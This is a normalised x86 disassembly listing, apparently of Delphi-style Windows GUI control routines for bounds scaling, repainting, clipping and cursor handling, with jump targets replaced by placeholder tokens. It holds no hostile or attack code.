mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_440038
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_440060
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_440084
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_4400a8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_4401a3
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403418
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4401aa
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a2e0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403418
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403418
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41a040
sub_4401b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_440cec
mov edx edi
mov eax ebx
call sub_440264
mov edx edi
mov eax ebx
call sub_441afc
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_440220
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_440264
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4402c0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4402ec
mov edx eax
mov ecx esp
mov eax esi
call sub_418d40
mov edx esp
mov eax ebx
call sub_440730
pop ecx
pop edx
pop esi
pop ebx
retn
sub_440304
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4402a8
mov ecx esp
mov edx esi
call sub_418d40
mov edx esp
mov eax ebx
call sub_440730
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44032c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4403ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4403b4
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
sub_4403bc
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4403e8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_440414
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_45b7b0
sub_440444
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_441a58
sub_4404c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_42313c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_423158
sub_44068c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_440722
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_420094
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4408a4
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404378
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440729
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4408d4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_440730
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_440778
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
test esi esi
je r-xdata
mov edx ebx
call sub_443d04
mov edx ebx
mov eax esi
call sub_443c30
mov eax ebx
call sub_43fef8
sub_4407c4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403418
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_441a58
mov eax edi
mov si 0xffd0
call sub_403418
sub_44085c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_454684
mov edx ebx
mov eax esi
call sub_41fc0c
sub_440880
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_441a58
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_441a58
pop ebx
retn
sub_4408a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_440818
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_40405c
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_440828
sub_4408d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440929
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4408a4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404378
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440930
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
mov eax esi
call sub_40442c
mov edx eax
mov eax ebx
call sub_440880
sub_440954
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_423098
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_441a58
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_423098
mov [ ebx + 0x84 ] eax
sub_440a67
sar [ edx ] 0x50
pop edx
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_441a58
sub_440adc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_440acc
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43da74
mov eax esi
call sub_43da74
jmp r-xdata
sub_440b14
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_41a1f8
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a08c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_41a218
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_440cec
mov eax ebx
call sub_457700
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403418
sub_440b94
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_440b14
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_440b14
jmp r-xdata
sub_440bb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_440c4e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440c55
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
sub_440c60
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_41a1f8
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_41a19c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_440244
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440cec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_440244
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4470c4
push eax
call InvalidateRect
push ebp
call sub_440c60
pop ecx
test al al
je r-xdata
mov al 0x1
sub_440d88
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4576d8
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_441a58
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403418
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440dec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4470c4
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_440ec5
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_444e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4470c4
push eax
call ReleaseDC
retn
sub_440f4c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax edi
call sub_441a8c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4403e8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ce8
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_441a58
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43ebf4
sub_441020
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44105c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_4410a8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_4410d4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_440848
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_440834
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_4029ec
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_4029ec
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4470c4
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_4411b8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_441204
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403418
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403418
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_4412c8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_441314
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_441360
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
